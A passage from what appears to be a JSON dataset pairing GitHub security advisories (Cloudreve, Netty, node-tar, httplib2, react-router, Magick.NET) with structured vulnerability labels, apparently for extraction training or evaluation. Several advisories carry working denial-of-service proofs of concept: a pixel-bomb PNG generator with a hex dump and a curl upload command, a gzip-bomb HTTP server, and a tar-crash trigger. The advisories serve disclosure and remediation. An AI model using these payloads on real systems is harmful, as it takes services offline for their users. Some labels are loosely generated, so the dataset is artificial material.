+          "cwe_category": "Uncontrolled Resource Consumption",
+          "severity": "high",
+          "attack_vector": "network",
+          "impact_summary": "Sending specially crafted HTTP requests could lead to out-of-memory exceptions or excessive CPU usage.",
+          "remediation_action": "Please upgrade to any of the fixed versions 19.0.8, 19.1.9, and 19.2.8."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-g9j2-8w95-3vwv",
+    "input_text": "## Summary\n\nCloudreve's built-in image processor decodes user-supplied images with Go's standard-library decoders (`image/png`, `image/jpeg`, `image/gif`) and guards **only the compressed file size** \u2014 never the *decoded* pixel dimensions. Go's decoders allocate a pixel buffer sized `bytesPerPixel \u00d7 width \u00d7 height` taken straight from the image header (e.g. a PNG's IHDR), with no upper bound on `width`/`height`. A tiny (tens-of-bytes) image that *declares* enormous dimensions therefore forces a multi-gigabyte-to-terabyte allocation (`make([]uint8, \u2026)`), exhausting memory. The resulting out-of-memory condition is a **fatal Go runtime error / kernel OOM-kill that `recover()` cannot catch**, terminating the whole Cloudreve process for all users.\n\nTwo reachable sinks share the same root cause:\n\n1. **Avatar upload** (`PUT /api/v4/user/setting/avatar`) \u2014 decodes synchronously in the request handler. Any authenticated user. **Cleanest single-request PoC.**\n2. **Thumbnail generation** (built-in generator, **enabled by default**) \u2014 decodes in the thumbnail queue worker. Reachable for the user's own files *and* for files inside a share, so a planted bomb can be (re)triggered through a public share link.\n\nPost-auth, low privilege. A single 65-byte upload deterministically takes the instance offline.\n\n### Details\n### Root cause \u2014 decode guarded by file size, not pixel count\n\nThe built-in generator is the **default** image thumbnailer:\n\n```go\n// inventory/setting.go  @ 26b6b10\n\"thumb_builtin_enabled\":   \"1\",         // ON by default\n\"thumb_builtin_max_size\":  \"78643200\",  // 75 MB \u2014 a *file size* cap\n\"thumb_vips_enabled\":      \"0\",         // libvips (which has its own limits) OFF by default\n...\n\"avatar_size\":             \"4194304\",   // 4 MB \u2014 a *file size* cap\n```\n`Builtin.Generate` checks the on-disk/entity size, then hands the raw bytes to the stdlib decoders:\n\n```go\n// pkg/thumb/builtin.go:144-152  @ 26b6b10\nfunc (b Builtin) Generate(ctx context.Context, es entitysource.EntitySource, ext string, previous *Result) (*Result, error) {\n    if es.Entity().Size() > b.settings.BuiltinThumbMaxSize(ctx) {   // 75 MB compressed-size check ONLY\n        return nil, fmt.Errorf(\"file is too big: %w\", ErrPassThrough)\n    }\n    img, err := NewThumbFromFile(es, ext)   // <-- decode; allocation happens here\n    ...\n}\n\n// pkg/thumb/builtin.go:34-60  @ 26b6b10\nfunc NewThumbFromFile(file io.Reader, ext string) (*Thumb, error) {\n    switch ext {\n    case \"jpg\", \"jpeg\": img, err = jpeg.Decode(file)\n    case \"gif\":         img, err = gif.Decode(file)\n    case \"png\":         img, err = png.Decode(file)   // <-- unbounded allocation\n    ...\n    }\n}\n```\n\nThere is **no `image.DecodeConfig` pre-check** and **no dimension/pixel cap** anywhere on the path. The only `Bounds()`/`MaxWidth` references in the package (`builtin.go:70,92,125`, `avatar_size_l=200`) act on the *already-decoded* image and are the *output* resize target \u2014 they execute long after the oversized input buffer has been allocated.\n\n### Why the allocation is unbounded (Go stdlib `image/png`)\n\nGo's PNG reader takes the dimensions verbatim from IHDR and rejects only non-positive values \u2014 there is no maximum:\n\n```go\n// Go src/image/png/reader.go \u2014 parseIHDR\nw := int32(binary.BigEndian.Uint32(d.tmp[0:4]))\nh := int32(binary.BigEndian.Uint32(d.tmp[4:8]))\nif w <= 0 || h <= 0 { return FormatError(\"non-positive dimension\") }   // only guard\nd.width, d.height = int(w), int(h)\n```\n\nOn the first IDAT, `readImagePass` allocates the destination image **before** consuming the compressed pixel data, e.g. for colour-type 6 (RGBA, 8-bit):\n\n```go\n// Go src/image/png/reader.go \u2014 readImagePass\nnrgba = image.NewNRGBA(image.Rect(0, 0, width, height))   // make([]uint8, 4*width*height)\n```\n\n`image.NewNRGBA` \u2192 `pixelBufferLength` \u2192 `mul3NonNeg(4, w, h)` only guards against *integer overflow* (returns \u22121, which panics), not against huge-but-valid sizes. So any `4\u00b7w\u00b7h` that fits in an `int` and is below the runtime's `maxAlloc` (~2\u2074\u2078 on amd64) proceeds to `make([]uint8, 4\u00b7w\u00b7h)`. The allocation occurs even if the IDAT stream is empty/truncated, so the malicious file needs no real pixel data.\n\n`jpeg.Decode` (allocates the `YCbCr`/`RGBA` buffer from the SOF/SOS dimensions, max 65535\u00d765535 \u2192 up to ~17 GB) and `gif.Decode` (allocates from the logical-screen / frame dimensions) are affected the same way.\n\n### Why this is a fatal crash, not a handled error\n\nFor realistic bomb sizes (GBs\u2013hundreds of GBs, all `< maxAlloc`), `make` proceeds and the process dies by one of:\n- **Kernel OOM-killer** sends SIGKILL when the touched pages can't be backed \u2014 not catchable by anything; or\n- the Go runtime **`throw(\"out of memory\")`** \u2014 a *fatal* error, **not** a recoverable `panic`, so `gin.Recovery()` does not save it.\n\n(Only the integer-overflow branch yields a recoverable panic; a competent attacker stays in the fatal-OOM regime, as the PoC does.)\n\n### Reachability of each sink\n\n**Avatar (synchronous, in the HTTP handler):**\n\n```go\n// routers/router.go:1269  @ 26b6b10  (under auth.Use(LoginRequired()) \u2192 user group)\nsetting.PUT(\"avatar\", middleware.RequiredScopes(types.ScopeUserInfoWrite), controllers.UploadAvatar)\n\n// service/user/setting.go:158-217  @ 26b6b10\nfunc UpdateUserAvatar(c *gin.Context) error {\n    ...\n    if c.Request.ContentLength == -1 || c.Request.ContentLength > avatarSettings.MaxFileSize { // 4 MB cap\n        return ...CodeFileTooLarge\n    }\n    return updateAvatarFile(c, u, c.GetHeader(\"Content-Type\"), c.Request.Body, avatarSettings)\n}\nfunc updateAvatarFile(...) error {\n    ext := \"png\"\n    switch contentType { case \"image/jpeg\",\"image/jpg\": ext=\"jpg\"; case \"image/gif\": ext=\"gif\" }\n    avatar, err := thumb.NewThumbFromFile(file, ext)   // <-- decode of attacker bytes; no dim check\n    ...\n}\n```\n\nA 65-byte PoC trivially satisfies the 4 MB `ContentLength` cap.\n\n**Thumbnail (queue worker, in-process):** `manager.Thumbnail` \u2192 `SubmitAndAwaitThumbnailTask` \u2192 `generateThumb` \u2192 `pipeline.Generate` (`pkg/filemanager/manager/thumbnail.go:128-145`, `pkg/thumb/pipeline.go:86`). The pipeline tries the **enabled-by-default** built-in generator for `png/jpg/gif` (other generators return `ErrPassThrough` for those extensions). Triggered via `GET /api/v4/file/thumb?uri=\u2026` for the user's own files, and the same generation runs for files reached through a share (`NavigatorCapabilityGenerateThumb`), so a bomb dropped into a public share can be (re)triggered by an anonymous visitor.\n\n## Proof of Concept\n\n### The bomb (65 bytes \u2014 included as `pixelbomb.png`)\n\nGenerated with:\n\n```python\nimport struct, zlib, binascii\ndef chunk(t,d):\n    c=t+d; return struct.pack(\">I\",len(d))+c+struct.pack(\">I\",binascii.crc32(c)&0xffffffff)\nsig=b'\\x89PNG\\r\\n\\x1a\\n'\nW,H=0x7FFFFFFF,0x10                       # 2147483647 x 16\nihdr=struct.pack(\">IIBBBBB\",W,H,8,6,0,0,0)  # 8-bit, colour-type 6 (RGBA)\npng=sig+chunk(b'IHDR',ihdr)+chunk(b'IDAT',zlib.compress(b''))+chunk(b'IEND',b'')\nopen('pixelbomb.png','wb').write(png)\n# Go will attempt make([]uint8, 4*W*H) = 137,438,953,408 bytes (128 GiB)\n```\n\nHex (entire file):\n\n```\n8950 4e47 0d0a 1a0a 0000 000d 4948 4452   .PNG........IHDR\n7fff ffff 0000 0010 0806 0000 0068 bce2   .............h..\ne300 0000 0849 4441 5478 9c03 0000 0000   .....IDATx......\n0148 0689 d200 0000 0049 454e 44ae 4260   .H.......IEND.B`\n82\n```\n(Dimensions are tunable: `4\u00b7W\u00b7H` must stay `< 2\u2076\u00b3` to avoid the overflow\u2192panic branch and `< maxAlloc`. `2147483647 \u00d7 16` \u2192 128 GiB reliably OOM-kills any host; shrink `H` for smaller targets.)\n\n### Trigger (avatar \u2014 single request)\n\n```bash\nbase=https://host/api/v4\ncurl -s -X PUT \"$base/user/setting/avatar\" \\\n     -H \"Authorization: Bearer $TOK\" \\\n     -H 'Content-Type: image/png' \\\n     --data-binary @pixelbomb.png\n```\n\n### Observable result\n\n```\n# Either the kernel OOM-killer terminates the process:\n#   dmesg: \"Out of memory: Killed process <pid> (cloudreve)\"\n# or the Go runtime aborts fatally:\n#   fatal error: runtime: out of memory\n# The Cloudreve process exits; all users get connection-refused until restart.\n```\n## Impact\n\n- **Direct primitive**: full availability loss \u2014 the process aborts, dropping all in-flight requests/sessions for every tenant on the instance.\n- **Persistence / repeatability**: the bomb can be stored (as a file whose thumbnail is generated on demand, or re-uploaded as an avatar), so the instance can be crashed again immediately after each restart; if supervised with auto-restart, the attacker scripts a sustained outage.\n- **Amplification**: each request costs the attacker ~65 bytes but costs the server an attempted multi-GB/TB allocation; trivial to repeat/parallelize.\n- **No special privilege**: any registered user (avatar). The thumbnail sink lets a planted bomb in a public share be re-triggered anonymously.\n\n## Suggested Mitigation\n\nCap **decoded pixel dimensions** before fully decoding, in addition to the existing file-size cap. Use `image.DecodeConfig` (reads only the header) and reject images whose `width \u00d7 height` (or either dimension) exceeds a configurable limit; apply it in `NewThumbFromFile` so both the thumbnail and avatar paths are covered.\n\n```diff\n--- a/pkg/thumb/builtin.go\n+++ b/pkg/thumb/builtin.go\n@@ func NewThumbFromFile(file io.Reader, ext string) (*Thumb, error) {\n-    var err error\n-    var img image.Image\n-    switch ext {\n+    const maxPixels = 50 * 1000 * 1000 // e.g. 50 MP; make configurable\n+    // Peek header-only to reject pixel/decompression bombs before allocation.\n+    var hdrBuf bytes.Buffer\n+    cfg, _, err := image.DecodeConfig(io.TeeReader(file, &hdrBuf))\n+    if err != nil {\n+        return nil, fmt.Errorf(\"failed to read image config: %w (%w)\", err, ErrPassThrough)\n+    }\n+    if int64(cfg.Width)*int64(cfg.Height) > maxPixels {\n+        return nil, fmt.Errorf(\"image dimensions too large (%dx%d): %w\", cfg.Width, cfg.Height, ErrPassThrough)\n+    }\n+    file = io.MultiReader(&hdrBuf, file) // replay consumed header bytes\n+    var img image.Image\n+    switch ext {\n         case \"jpg\", \"jpeg\": img, err = jpeg.Decode(file)\n         case \"gif\":         img, err = gif.Decode(file)\n         case \"png\":         img, err = png.Decode(file)\n```\n\nAdditionally:\n- Apply the same pixel cap to the avatar path (covered automatically if it routes through `NewThumbFromFile`, as it does).\n- Consider running image decoding in a memory-limited child process / with `debug.SetMemoryLimit` + a `GOMEMLIMIT`-aware soft fail so a single decode cannot take down the whole server even if a future decoder lacks a header pre-check.\n\nWhy sufficient: `DecodeConfig` parses only the header (no large allocation), so the oversized buffer is never created; legitimate images decode unchanged.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": "CVE-2026-55497",
+          "affected_products": [
+            {
+              "vendor": "GO",
+              "product": "github.com/cloudreve/Cloudreve/v3",
+              "version_range": "<= 3.0.0-20250225100611-da4e44b77af4"
+            },
+            {
+              "vendor": "GO",
+              "product": "github.com/cloudreve/Cloudreve/v4",
+              "version_range": "< 4.0.0-20260613024411-3607f79bb44c"
+            }
+          ],
+          "cwe_category": "Uncontrolled Resource Consumption",
+          "severity": "medium",
+          "attack_vector": "network",
+          "impact_summary": "A tiny image with oversized dimensions can cause a fatal memory allocation error, leading to process termination and potential data loss.",
+          "remediation_action": "Update Cloudreve's image processor to limit pixel dimensions of decoded images."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-v74w-7mr3-4qg3",
+    "input_text": "### Summary\nAn attacker can cause Denial of Service by sending a specially crafted malicious XML payload (e.g., repeated `</` characters) to a Netty server utilizing XmlFrameDecoder, causing the server's EventLoop thread to exhaust CPU resources and become unresponsive.\n\n### Details\n`io.netty.handler.codec.xml.XmlFrameDecoder` suffers from a vulnerability resulting in CPU exhaustion. When `<` followed by `/` is encountered, the decoder scans the remaining buffer for a closing `>`.\nBecause the parser state is not saved between `decode()` invocations, an attacker can trickle-feed a payload of `</` characters. This forces the decoder to repeatedly rescan the entire accumulated buffer. A 1MB `maxFrameLength` is enough to completely hang a server's thread while it loops endlessly.\n\n### Impact\nDenial of Service via CPU Exhaustion. Any application utilizing Netty's XmlFrameDecoder is impacted. An unauthenticated remote attacker can exploit this flaw by sending a modest amount of malformed XML data to an exposed port.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": null,
+          "affected_products": [
+            {
+              "vendor": "MAVEN",
+              "product": "io.netty:netty-codec-xml",
+              "version_range": "<= 4.1.135.Final"
+            },
+            {
+              "vendor": "MAVEN",
+              "product": "io.netty:netty-codec-xml",
+              "version_range": ">= 4.2.0.Final, <= 4.2.15.Final"
+            }
+          ],
+          "cwe_category": "Uncontrolled Resource Consumption",
+          "severity": "high",
+          "attack_vector": "network",
+          "impact_summary": "Denial of Service via CPU exhaustion on applications utilizing Netty's XmlFrameDecoder.",
+          "remediation_action": "Update to a patched version of Netty that mitigates this vulnerability."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-r292-9mhp-454m",
+    "input_text": "## Summary\n`node-tar` (npm `tar`) contains an uncontrolled-recursion stack-exhaustion DoS in the internal `mapHas` helper used by `filesFilter`. When a consumer calls `tar.t(...)` or `tar.x(...)` with a non-empty member-selection list, node-tar installs a filter that closes over the recursive `mapHas` (`src/list.ts:33-44`). `mapHas` walks an entry path upward one `path.dirname()` call per recursion **with no segment cap**. A single crafted tar with a GNU-`L` (or PAX-`x`) long-path header can deliver a path of tens of thousands of `/`-separated segments (up to `maxMetaEntrySize` = 1 MiB). The recursion overflows the call stack, throwing an uncatchable `RangeError` that terminates the Node process on async/streaming consumers.\n\n## Root Cause\n`filesFilter` (`src/list.ts:27-51`) is installed whenever a caller passes a member-selection list (`src/list.ts:119-122`, `src/extract.ts:55-57`). Its filter is invoked at `src/parse.ts:253` (`entry.ignore = entry.ignore || !this.filter(entry.path, entry)`) inside `Parser[CONSUMEHEADER]` \u2014 and crucially **outside** the only try/catch in that method (which wraps `new Header` at `src/parse.ts:179-183`). `mapHas` recurses once per path segment with no depth limit. The `Unpack` `maxDepth` guard (`src/unpack.ts:342`, in `[CHECKPATH]`) only runs on the `'entry'` event, which fires *after* `CONSUMEHEADER` has already invoked the filter \u2014 so the stack overflows before any depth guard executes. `tar.t` (list) has no `maxDepth` at all.\n\n## Impact\nUnauthenticated, remotely-triggerable denial of service: a ~188-byte gzip (\u224826 KB tar) crashes any service that lists or extracts *selected members* from an untrusted archive (package registries, CI artifact/cache restore, upload processors). On async (`await tar.t(...)`/`tar.x(...)`) and streaming/`pipe` consumers the `RangeError` escapes the promise as an `uncaughtException` and terminates the process \u2014 standard defensive `try/catch` around the async call does NOT prevent it. (The synchronous API is catchable; the async/stream paths \u2014 the dominant server pattern \u2014 are not.)\n\n## Proof of Concept\n```js\n// Build a tar whose single entry has a GNU-L long path of ~12,000 \"a/\" segments (~26 KB),\n// gzip it (\u2248188 bytes), then have a consumer list/extract with member selection:\nconst tar = require('tar');\nawait tar.t({ file: 'evil.tar.gz', gzip: true }, ['some-member']); // -> RangeError, process exit\n```\nEmpirically reproduced on Node v24.18.0 against built `dist/commonjs` of node-tar 7.5.20: 188-byte gzip \u2192 26,112-byte tar (12,000 segments) \u2192 uncaught `RangeError: Maximum call stack size exceeded` \u2192 process exit. A control run with no member-selection list (filter not installed) parses cleanly (exit 0), isolating `mapHas` as the sole cause.\n\n## Attack Chain\n1. **Entry.** Attacker crafts a tar with a GNU `L` (or PAX `x`) long-path header whose body is `\"a/\"`\u00d7~12000 (~26 KB), followed by a normal file entry.\n   - **Guard:** `maxMetaEntrySize` caps the meta body at 1 MiB (`src/parse.ts:241`).\n   - **Bypass proof:** 26 KB \u226a 1 MiB \u2192 accepted (verified: 26 KB archive parsed up to the filter).\n2. **Trigger.** Victim service calls `tar.t({file},[sel])` or `tar.x({file,cwd},[sel])` (member selection \u2014 a documented, common API).\n   - **Guard:** `Unpack.maxDepth` (default 1024) at `src/unpack.ts:342`; decompression-ratio guard.\n   - **Bypass proof:** `maxDepth` lives in `[CHECKPATH]` on the `'entry'` event, which fires *after* `CONSUMEHEADER`'s filter call \u2014 the crash occurs before it (extract exits 1 with default maxDepth). `tar.t` has no maxDepth. Ratio is ~139\u00d7 (trivial); no total-bytes cap applies to the uncompressed meta body.\n3. **Sink.** `this.filter(entry.path)` \u2192 `mapHas` recurses once per `/` segment (`src/list.ts:39`).\n   - **Guard:** try/catch in `CONSUMEHEADER`.\n   - **Bypass proof:** the only try/catch wraps `new Header` (`src/parse.ts:179-183`); the `this.filter(...)` call at `src/parse.ts:253` is outside it. The `RangeError` propagates out of the stream write/`'data'` path \u2192 uncaught exception (verified: `process.on('uncaughtException')` fires; async `await`+`try/catch` does NOT intercept).\n4. **Impact.** Node process termination; a 188-byte gzip crashes any consumer that lists/extracts selected members from untrusted archives.\n\n## Bypass Evidence\n- `mapHas` recursion is member-name-independent: the crash fires even when the requested members do not match the malicious entry path \u2014 the attacker only needs the consumer to *use* member selection.\n- Standalone `mapHas` overflows at 20k\u201330k segments; on the real streaming path (atop `write \u2192 CONSUMECHUNK \u2192 CONSUMEHEADER \u2192 filter`) it crashes at \u22648k segments (finder's ~12k estimate is accurate for the reachable path).\n- Control (no member list \u2192 no filter) parses cleanly (exit 0), isolating `mapHas`.\n\n## Affected Versions\n`<= 7.5.20` (npm `tar`). `mapHas` present verbatim on tag `v7.5.20` (latest GitHub release and npm `dist-tag latest`); no segment/depth cap in `src/list.ts` or the `CONSUMEHEADER` filter path; HEAD == 7.5.20, no unreleased fix.\n\n## Suggested Fix\nRewrite `mapHas` iteratively (walk `dirname` in a `while` loop with a segment/visited cap), or enforce a hard path-segment limit in `Header`/`Parser` independent of `maxMetaEntrySize`, applied before any per-entry filter runs.\n\n## Dedup Note\nDistinct from CVE-2024-28863 / GHSA-f5x3-32g6-qm9j \"lack of folders depth validation\" (that bounds `mkdir` recursion during *extraction* via `maxDepth` in `Unpack[CHECKPATH]` on the `'entry'` event \u2014 a different sink, code path, and fix; runs after the filter and does not apply to `tar.t`). Also distinct from the PAX NUL/numeric-path crash advisories (improper-input-to-fs / type confusion, not recursion) and the gzip-bomb advisory (resource exhaustion on disk writes). None touch `list.ts`/`filesFilter`/`mapHas` or require member selection.\n\n---\nReported by **zx (Jace)** \u2014 GitHub: @manus-use",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": null,
+          "affected_products": [
+            {
+              "vendor": "NPM",
+              "product": "tar",
+              "version_range": "<= 7.5.20"
+            }
+          ],
+          "cwe_category": "Uncontrolled Resource Consumption",
+          "severity": "medium",
+          "attack_vector": "network",
+          "impact_summary": "Remote attackers can cause a denial of service by crafting tar archives with long paths.",
+          "remediation_action": "Upgrade to a newer version of node-tar that may have mitigated this vulnerability."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-j5g9-f88f-gfj3",
+    "input_text": "### Summary\n\nThe `httplib2` HTTP client library performs unbounded decompression of HTTP response bodies encoded with `Content-Encoding: gzip` or `deflate`. A malicious or compromised HTTP server can return a small compressed payload (approximately 150 KB) that expands to an arbitrarily large size in memory (150 MB or more), causing `MemoryError` or OOM-kill in the client process. This is a classic decompression bomb (zip bomb) attack against the HTTP client.\n\nAny application using `httplib2.Http().request()` against untrusted or attacker-controlled HTTP endpoints is affected.\n\n### Details\n\n**Affected code:** `httplib2/__init__.py` - `_decompressContent()` function\n\nThe decompression path has two unbounded operations:\n\n1. **gzip decompression** (line 394):\n   ```python\n   content = gzip.GzipFile(fileobj=io.BytesIO(new_content)).read()\n   ```\n   The `.read()` call with no size argument decompresses the entire gzip payload into a single in-memory bytes object. There is no limit on the decompressed size.\n\n2. **deflate decompression** (line 397):\n   ```python\n   content = zlib.decompress(content, zlib.MAX_WBITS)\n   ```\n   Similarly, `zlib.decompress()` returns the fully decompressed content as a single bytes object with no size bound.\n\n3. **Automatic invocation** (line 1431): `_decompressContent()` is called automatically on every HTTP response that includes a `Content-Encoding: gzip` or `deflate` header. The full compressed body is already buffered in memory via `response.read()` before decompression begins.\n\n**Root cause:** There is no `max_decompressed_size`, streaming decompression with size tracking, or decompression ratio check anywhere in the decompression path. The library unconditionally trusts the server's compressed payload size.\n\n**Attack vector:** Any HTTP server (including man-in-the-middle attackers or compromised upstream services) can trigger this by returning a response with:\n- `Content-Encoding: gzip` header\n- A small compressed body that decompresses to an arbitrarily large size\n\n### Proof of Concept\n\n**Step 1 - Start a malicious HTTP server that serves a gzip decompression bomb:**\n\n```python\n#!/usr/bin/env python3\n\"\"\"Malicious HTTP server that serves a gzip decompression bomb.\"\"\"\nimport gzip\nimport http.server\nimport io\nimport socketserver\n\nUNCOMPRESSED_SIZE = 150 * 1024 * 1024  # 150 MB\n\ndef make_payload():\n    \"\"\"Create a gzip payload: ~150 KB compressed -> 150 MB decompressed.\"\"\"\n    buf = io.BytesIO()\n    with gzip.GzipFile(fileobj=buf, mode=\"wb\", compresslevel=9) as gz:\n        chunk = b\"A\" * (1024 * 1024)  # 1 MB of repeating bytes\n        for _ in range(UNCOMPRESSED_SIZE // len(chunk)):\n            gz.write(chunk)\n    return buf.getvalue()\n\nPAYLOAD = make_payload()\n\nclass Handler(http.server.BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.send_header(\"Content-Type\", \"application/octet-stream\")\n        self.send_header(\"Content-Encoding\", \"gzip\")\n        self.send_header(\"Content-Length\", str(len(PAYLOAD)))\n        self.end_headers()\n        self.wfile.write(PAYLOAD)\n    def log_message(self, fmt, *args):\n        pass\n\nwith socketserver.TCPServer((\"127.0.0.1\", 8000), Handler) as httpd:\n    print(f\"Bomb server ready: {len(PAYLOAD)} bytes compressed -> \"\n          f\"{UNCOMPRESSED_SIZE} bytes decompressed\")\n    httpd.serve_forever()\n```\n\n**Step 2 - Run the httplib2 client (in a separate terminal):**\n\n```python\n#!/usr/bin/env python3\n\"\"\"Client that demonstrates MemoryError from httplib2 decompression bomb.\"\"\"\nimport resource\nimport httplib2\n\n# Set a 180 MB memory limit to make the crash deterministic\nLIMIT_MB = 180\nlimit = LIMIT_MB * 1024 * 1024\nresource.setrlimit(resource.RLIMIT_AS, (limit, limit))\n\nhttp = httplib2.Http(timeout=5)\ntry:\n    response, content = http.request(\"http://127.0.0.1:8000/\")\n    print(f\"Unexpected success: received {len(content)} bytes\")\nexcept MemoryError:\n    print(f\"MemoryError confirmed: decompression bomb exhausted \"\n          f\"{LIMIT_MB} MB memory limit\")\n    # This is the expected outcome - the 150 KB compressed payload\n    # expanded to 150 MB during decompression, exceeding the limit.\n```\n\n**Expected output (client):**\n```\nMemoryError confirmed: decompression bomb exhausted 180 MB memory limit\n```\n\n**Reproduction metrics:**\n- Compressed payload size: **152,908 bytes** (~150 KB)\n- Decompressed size: **157,286,400 bytes** (150 MB)\n- Amplification ratio: **~1,029x**\n- Client memory limit: 180 MB -> `MemoryError` triggered during `gzip.GzipFile.read()`\n\n### Impact\n\n**Severity: High**\n\nAny application using `httplib2` to make HTTP requests to untrusted servers is vulnerable. The attack requires no authentication, no special configuration, and no user interaction - the server simply returns a crafted gzip-compressed response.\n\n| Parameter | Value |\n|---|---|\n| Compressed payload | ~150 KB |\n| Decompressed size | 150 MB (configurable by attacker) |\n| Amplification ratio | ~1,029x |\n| Authentication required | None |\n| User interaction required | None |\n| Prerequisites | Client makes any HTTP request to attacker-controlled server |\n\n**Real-world scenarios:**\n- **Web scrapers/crawlers** that fetch pages from untrusted URLs\n- **API clients** connecting to third-party services\n- **Webhook handlers** that follow redirects to attacker-controlled endpoints\n- **CI/CD pipelines** that download dependencies or artifacts over HTTP\n- **Any MITM attacker** on an unencrypted HTTP connection can inject the compressed payload\n\n**Impact scaling:** The attacker can create arbitrarily large decompression bombs. A 1 MB compressed payload can decompress to several gigabytes, guaranteeing OOM-kill on virtually any system. The attack is fully deterministic and requires only a single HTTP response.\n\n**Downstream exposure:** `httplib2` is a widely used Python HTTP client library with millions of downloads. It is a dependency of Google's API client libraries (`google-api-python-client`, `google-auth-httplib2`), meaning applications using Google Cloud APIs may be indirectly affected if they process responses from untrusted intermediaries.\n\n---\n### Credit\n\nFound by a security research team from the University of Sydney, focusing on detecting open source software vulnerabilities.\nLiyi Zhou: https://lzhou1110.github.io/\nZiyue Wang: https://zyy0530.github.io/\nStrick: https://str1ckl4nd.github.io/\nMaurice: https://maurice.busystar.org/\nChenchen Yu: https://7thparkk.github.io/",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": "CVE-2026-59939",
+          "affected_products": [
+            {
+              "vendor": "PIP",
+              "product": "httplib2",
+              "version_range": "< 0.32.0"
+            }
+          ],
+          "cwe_category": "Uncontrolled Resource Consumption",
+          "severity": "high",
+          "attack_vector": "network",
+          "impact_summary": "Attacker can cause a `MemoryError` or OOM-kill by sending a compressed payload that expands to an arbitrarily large size.",
+          "remediation_action": "Implement bounds on decompressed sizes and streaming decompression with size tracking in the HTTP client library."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-chx6-hx7r-mcp5",
+    "input_text": "This is a follow up to https://github.com/remix-run/react-router/security/advisories/GHSA-8x6r-g9mw-2r78 that covers additional reported scenarios in which the manifest endpoint could be accessed via unauthenticated targeted requests that would put heavy load on the server and slow down response times.\n\n> [!NOTE]\n> This only impacts Framework Mode applications.  This does not impact your application if you are using Declarative or Data Mode.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": "CVE-2026-55685",
+          "affected_products": [
+            {
+              "vendor": "NPM",
+              "product": "react-router",
+              "version_range": ">= 7.0.0, < 7.18.0"
+            }
+          ],
+          "cwe_category": "Uncontrolled Resource Consumption",
+          "severity": "high",
+          "attack_vector": "unknown",
+          "impact_summary": "Framework Mode applications may experience heavy load and slow response times from unauthenticated requests to the manifest endpoint.",
+          "remediation_action": "Disable Framework Mode or use Declarative/Data Mode for unaffected applications."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-qhmf-7fc4-8q3h",
+    "input_text": "When providing invalid arguments to the connected-components option an infinite loop will occur.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": "CVE-2026-55595",
+          "affected_products": [
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q16-HDRI-arm64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-x86",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-x64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-arm64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-OpenMP-x64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-OpenMP-arm64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-AnyCPU",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q16-x86",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q16-x64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q16-arm64",
+              "version_range": "< 14.15.0"
+            }
+          ],
+          "cwe_category": "Uncontrolled Resource Consumption",
+          "severity": "medium",
+          "attack_vector": "local",
+          "impact_summary": "Invalid arguments to connected-components option can cause an infinite loop and potentially destabilize system operations.",
+          "remediation_action": "Ensure that only valid arguments are provided to the connected-components option to prevent potential infinite loops."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-mx48-2qq3-23hf",
+    "input_text": "A missing depth check in the MVG decoder will result in a stack overflow when a crafted image is provided.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": "CVE-2026-55594",
+          "affected_products": [
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q16-HDRI-arm64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-x86",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-x64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-arm64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-OpenMP-x64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-OpenMP-arm64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-AnyCPU",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q16-x86",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q16-x64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q16-arm64",
+              "version_range": "< 14.15.0"
+            }
+          ],
+          "cwe_category": "Uncontrolled Resource Consumption",
+          "severity": "medium",
+          "attack_vector": "network",
+          "impact_summary": "A stack overflow can occur leading to potential security vulnerabilities and system crashes.",
+          "remediation_action": "Update the MVG decoder with a proper depth check to prevent stack overflow."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-5xf7-4p34-54qr",
